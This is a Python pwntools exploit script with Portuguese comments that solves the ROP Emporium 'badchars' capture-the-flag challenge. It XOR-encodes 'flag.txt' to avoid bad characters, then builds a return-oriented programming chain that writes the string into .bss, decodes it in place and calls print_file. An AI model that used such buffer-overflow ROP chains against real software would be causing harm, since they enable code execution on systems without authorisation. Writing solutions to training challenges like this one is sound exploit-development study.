#!/usr/bin/env python3

from pwn import *
import binascii

elf = ELF('badchars')
p = process(elf.path)

argument_unxored = b'flag.txt'
argument = ''
for i in argument_unxored:
	argument += chr(i ^ 2) # 2 porque 1 não daria certo, ele retornaria uma string que possui um bad char

# badchars: x, g, a, .
#flag_argument_ascii = b'dnce,vzv' # string retornada
flag_argument_ascii = b'vzv,ecnd'  # string formatada para little endian
flag_argument_hex = binascii.hexlify(flag_argument_ascii)
flag_argument = int(flag_argument_hex, 16)

# Gadgets
pop_r12_r13_r14_r15 = 0x40069c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
mov_r12_to_r13 = 0x400634	   # mov qword ptr [r13], r12 ; ret
pop_r14_r15 = 0x4006a0		   # pop r14 ; pop r15 ; ret
xor_r14_to_r15 = 0x400628 	   # xor byte ptr [r15], r14b ; ret
pop_rdi = 0x4006a3			   # pop rdi ; ret
print_file = 0x400510

# .data Segment addr
#segment_data = 0x601028	# Dont Working

# .bss Segment addr
segment_data = 0x00601038

# r12 = flag_argument
# r13 = segment_data
# r14 = 0
# r15 = 0
# [r13] = segment_data + flag_argument
# precisamos fazer um xor: flag ^ 2
# a flag está no segmento .bss

xpl = b''
xpl += b'A' * 40
xpl += p64(pop_r12_r13_r14_r15)
xpl += p64(flag_argument) + p64(segment_data) + p64(0) + p64(0)
xpl += p64(mov_r12_to_r13)

# vamos fazer um loop pra ir dando um xored de byte em byte
for i in range(8):
	xpl += p64(pop_r14_r15)					# r14 = 2 ; r15 = segment_data + i
	xpl += p64(2) + p64(segment_data + i)
	xpl += p64(xor_r14_to_r15)				# [r15] = xor(r15 ^ r14)


# o loop vai armazenar sempre 2 por conta do pop, o 2 não é incrementado, ele seria se fosse um mov
# enfim, o r14 = 2
# r15 vai guardar o valor do segment_data que contem a nossa string xored
# o xor vai fazer um xor entre r14 e r15 ou seja, entre: dnce,vzv ^ 2
# veja que dnce,vzv tem 7 letras
# por isso o range de 0-7 (8)
# ele ira repetir isso ate completar toda a string
# no primeiro for a variavel i = d
# no segundo for a variavel i = n
# e por assim vai, e veja que cada variavel esta sendo ^ com 2, 2 porque codificamos a string com o valor 2 lá em cima no primeiro for
# r14b o b é justamente um byte, ele vai fazer um xor só o byte LSB (ou os 8 bits LSB) de r15
# esse byte de r15 vai ser: d, n etc

xpl += p64(pop_rdi)
xpl += p64(segment_data) # flag.txt
xpl += p64(print_file)	 # print_file(flag.txt)

p.sendline(xpl)
p.interactive()

with open('payload', 'wb') as file:
	file.write(xpl)
